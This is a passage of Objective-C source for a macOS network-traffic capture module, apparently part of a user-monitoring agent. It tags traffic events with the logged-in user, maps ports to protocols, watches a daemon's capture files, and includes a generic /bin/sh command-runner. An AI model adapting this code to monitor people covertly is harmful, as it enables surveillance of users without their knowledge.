            FxNetworkTrafficEvent * trafficEvent = [[FxNetworkTrafficEvent alloc]init];
            [trafficEvent setDateTime:[DateTimeFormat phoenixDateTime]];
            [trafficEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
            [trafficEvent setMApplicationID:@""];
            [trafficEvent setMApplicationName:@""];
            [trafficEvent setMTitle:@""];
            [trafficEvent setMStartTime:[NSString stringWithFormat:@"%@",mStartTime]];
            [trafficEvent setMEndTime:[NSString stringWithFormat:@"%@",[DateTimeFormat phoenixDateTime]]];
            [trafficEvent setMNetworkInterfaces:allNetworkInterfaces];
            [mDelegate performSelector:mSelector onThread:mThread withObject:trafficEvent waitUntilDone:NO];
            [trafficEvent release];
            
        }else{
            DLog(@"### No Data  No Send OK ?");
        }
        [allNetworkInterfaces release];
    }
    
}

#pragma mark ### GET Utility

- (void)getCurrentIPAddress {
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    int success = 0;
    success = getifaddrs(&interfaces);
    if (success == 0) {
        temp_addr = interfaces;
        while(temp_addr != NULL) {
            if(temp_addr->ifa_addr->sa_family == AF_INET) {
                if([[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en0"]) {
                    self.mEn0IP = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                }
                else if([[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en1"]) {
                    self.mEn1IP = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                }
            }
            temp_addr = temp_addr->ifa_next;
        }
    }
    freeifaddrs(interfaces);
}

-(FxProtocolType) getProtocolTypeByPortNum:(int)aPort{
    int result = -1;
    if (aPort == 1) {
        result = kProtocolTypeTCPMUX;
    }else if (aPort == 5) {
        result = kProtocolTypeRJE;
    }else if (aPort == 7) {
        result = kProtocolTypeECHO;
    }else if (aPort == 18) {
        result = kProtocolTypeMSP;
    }else if (aPort == 20) {
        result = kProtocolTypeFTPData;
    }else if (aPort == 21) {
        result = kProtocolTypeFTPControl;
    }else if (aPort == 22) {
        result = kProtocolTypeSSH;
    }else if (aPort == 23) {
        result = kProtocolTypeTelnet;
    }else if (aPort == 25) {
        result = kProtocolTypeSMTP;
    }else if (aPort == 29) {
        result = kProtocolTypeMSGICP;
    }else if (aPort == 37) {
        result = kProtocolTypeTime;
    }else if (aPort == 42) {
        result = kProtocolTypeHostNameServer;
    }else if (aPort == 43) {
        result = kProtocolTypeWhoIs;
    }else if (aPort == 49) {
        result = kProtocolTypeLoginHostProtocol;
    }else if (aPort == 53) {
        result = kProtocolTypeDNS;
    }else if (aPort == 69) {
        result = kProtocolTypeTFTP;
    }else if (aPort == 70) {
        result = kProtocolTypeGopher;
    }else if (aPort == 79) {
        result = kProtocolTypeFinger;
    }else if (aPort == 80) {
        result = kProtocolTypeHTTP;
    }else if (aPort == 103) {
        result = kProtocolTypeX400;
    }else if (aPort == 108) {
        result = kProtocolTypeSNA;
    }else if (aPort == 109) {
        result = kProtocolTypePOP2;
    }else if (aPort == 110) {
        result = kProtocolTypePOP3;
    }else if (aPort == 115) {
        result = kProtocolTypeSFTP;
    }else if (aPort == 118) {
        result = kProtocolTypeSQLService;
    }else if (aPort == 119) {
        result = kProtocolTypeNNTP;
    }else if (aPort == 137) {
        result = kProtocolTypeNetBIOSNameService;
    }else if (aPort == 139) {
        result = kProtocolTypeNetBIOSDatagramService;
    }else if (aPort == 143) {
        result = kProtocolTypeIMAP;
    }else if (aPort == 150) {
        result = kProtocolTypeNetBIOSSessionService;
    }else if (aPort == 156) {
        result = kProtocolTypeSQLServer;
    }else if (aPort == 161) {
        result = kProtocolTypeSNMP;
    }else if (aPort == 179) {
        result = kProtocolTypeBGP;
    }else if (aPort == 190) {
        result = kProtocolTypeGACP;
    }else if (aPort == 194) {
        result = kProtocolTypeIRC;
    }else if (aPort == 197) {
        result = kProtocolTypeDLS;
    }else if (aPort == 389) {
        result = kProtocolTypeLDAP;
    }else if (aPort == 396) {
        result = kProtocolTypeNovellNetware;
    }else if (aPort == 443) {
        result = kProtocolTypeHTTPS;
    }else if (aPort == 444) {
        result = kProtocolTypeSNPP;
    }else if (aPort == 445) {
        result = kProtocolTypeMicrosoftDS;
    }else if (aPort == 458) {
        result = kProtocolTypeAppleQuickTime;
    }else if (aPort == 546) {
        result = kProtocolTypeDHCP_Client;
    }else if (aPort == 547) {
        result = kProtocolTypeDHCP_Server;
    }else if (aPort == 563) {
        result = kProtocolTypeSNEW;
    }else if (aPort == 569) {
        result = kProtocolTypeMSN;
    }else if (aPort == 1080) {
        result = kProtocolTypeSocks;
    }
    if (result == -1) {
        result = kProtocolTypeUnknown;
    }
    return result;
}

-(NSString *) getSource:(NSString *)aString {
    NSString * result=@"";
    if ([aString rangeOfString:@"Referer: "].location != NSNotFound) {
        result = [[[[aString componentsSeparatedByString:@"Referer: "] objectAtIndex:1] componentsSeparatedByString:@"\n"] objectAtIndex:0];
    }
    return result;
}

-(NSString *)getOnlyHostname:(NSString *)aString{
    NSArray * spliter = [[[NSArray alloc]initWithArray:[aString componentsSeparatedByString:@"domain name pointer "]] autorelease];
    if ([spliter count]>1) {
        return [spliter objectAtIndex:1];
    }
    return @"";
}

#pragma mark ### CommandRunner

- (NSString*) runAsCommand :(NSString *)aCmd {
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]init];
    
    NSPipe* pipe = [NSPipe pipe];
    NSTask* task = [[NSTask alloc] init];
    [task setLaunchPath: @"/bin/sh"];
    [task setArguments:@[@"-c", aCmd]];
    [task setStandardOutput:pipe];
    
    NSFileHandle* file = [pipe fileHandleForReading];
    [task launch];
    
    NSData *data = [file readDataToEndOfFile];
    
    [task waitUntilExit];
    [task release];
    
    NSString * result = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
    [file closeFile];
    
    [pool drain];
    
    return [result autorelease];
}

#pragma mark ### watchIncomingData

-(void) watchThisPath:(NSArray *) afileInputPath {
    
    FSEventStreamContext context;
    context.info = (__bridge void *)(self);
    context.version = 0;
    context.retain = NULL;
    context.release = NULL;
    context.copyDescription = NULL;
    
    if (mStream != nil) {
        FSEventStreamUnscheduleFromRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStop(mStream);
        mStream = nil;
        mCurrentRunloopRef = nil;
    }
    
    if([afileInputPath count]>0){
        mCurrentRunloopRef = CFRunLoopGetCurrent();
        mStream =   FSEventStreamCreate(NULL,
                                        &networkTrafficDidReceive,
                                        &context,
                                        (__bridge CFArrayRef) afileInputPath,
                                        kFSEventStreamEventIdSinceNow,
                                        1.5,
                                        kFSEventStreamCreateFlagWatchRoot  |
                                        kFSEventStreamCreateFlagUseCFTypes |
                                        kFSEventStreamCreateFlagFileEvents
                                        );
        
        FSEventStreamScheduleWithRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStart(mStream);
    }
}

#pragma mark ### fileChangeEvent

static void networkTrafficDidReceive(ConstFSEventStreamRef streamRef,
                                     void* callBackInfo,
                                     size_t numEvents,
                                     void* eventPaths,
                                     const FSEventStreamEventFlags eventFlags[],
                                     const FSEventStreamEventId eventIds[]) {
    
    NSArray * paths = [[NSArray alloc]initWithArray:(__bridge NSArray*)eventPaths];
    for (int i=0; i < [paths count]; i++) {
        FSEventStreamEventFlags flags = eventFlags[i];
        if ([[paths objectAtIndex:i]rangeOfString:@"nt_data"].location != NSNotFound &&
            (flags & kFSEventStreamEventFlagItemCreated || flags & kFSEventStreamEventFlagItemRenamed)  ){
            NSString *path = [NSString stringWithFormat:@"%@", paths[i]];
            NSBlockOperation *opBlock = [NSBlockOperation blockOperationWithBlock:^(){
                NSData * dataFromFile = [[NSData alloc]initWithContentsOfFile:path];
                [_NetworkTrafficCapture performSelector:@selector(sendToDaemonForDeleteingFile:) onThread:[_NetworkTrafficCapture mThread] withObject:path waitUntilDone:NO];
                if (dataFromFile) {
                    NSMutableArray *info = [[NSMutableArray alloc]initWithArray:[NSKeyedUnarchiver unarchiveObjectWithData:dataFromFile]];
                    [_NetworkTrafficCapture receiveDataFromDaemon:info];
                    [info release];
                }
                [dataFromFile release];
            }];
            [_NetworkTrafficCapture.mCollectorQueue addOperation:opBlock];
        }
    }
    [paths release];
}

-(void) receiveDataFromDaemon:(NSMutableArray *)aInfo{
    for (int i=0; i < [aInfo count]; i++) {
        if ([[[aInfo objectAtIndex:i] objectForKey:@"NetworkType"] intValue] == kNetworkTypeWired) {
            [self receivePacketByLan:[aInfo objectAtIndex:i]];
        }else if ([[[aInfo objectAtIndex:i] objectForKey:@"NetworkType"] intValue] == kNetworkTypeWifi) {
            [self receivePacketByWifi:[aInfo objectAtIndex:i]];
        }
    }
}


#pragma mark #### sendToDaemon

-(void)sendToDaemonForDeleteingFile:(NSString *)aPath{
    
    DLog(@"::==> sendToDaemonForDeleteingFile %@",aPath);
    
    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"deleteallfilethatcontain"forKey:@"type"];
    [myCommand setObject:[NSString stringWithFormat:@"%@nt_data",mDataPath]forKey:@"path"];
    
    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];
    
    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    [messagePortSender writeDataToPort:data];
    
    [messagePortSender release];
    messagePortSender = nil;
    [data release];
    [myCommand release];
}

-(void)sendToDaemonWithToStartCaptureWithDuration:(int)aMin frequency:(int)aFre{
    
    DLog(@"::==> sendToDaemonWithToStartCaptureWithDuration %d frequency %d",aMin,aFre);
    
    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"networktraffic_start"forKey:@"type"];
    [myCommand setObject:mMyUrl forKey:@"url"];
    
    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];
    
    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    [messagePortSender writeDataToPort:data];
    
    [messagePortSender release];
    messagePortSender = nil;
    [data release];
    [myCommand release];
}

-(void)sendToDaemonWithToStop{
    
    DLog(@"::==> sendToDaemonWithToStop");
    
    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"networktraffic_stop"forKey:@"type"];

    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];
    
    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    [messagePortSender writeDataToPort:data];
    
    [messagePortSender release];
    messagePortSender = nil;
    [data release];
    [myCommand release];
}

#pragma mark ### Destroy

-(void)dealloc{
    _NetworkTrafficCapture = nil;
    mStream = nil;
    mCurrentRunloopRef = nil;
    
    [mThread release];
    [mIPToRevert release];
    [mHostnames release];
    
    [mTotalUploadByLan release];
    [mTotalDownloadByLan release];
    [mTotalUploadByWifi release];
    [mTotalDownloadByWifi release];
    
    [mWatchlist release];
    [mCollectorQueue release];
    
    [super dealloc];
}
@end
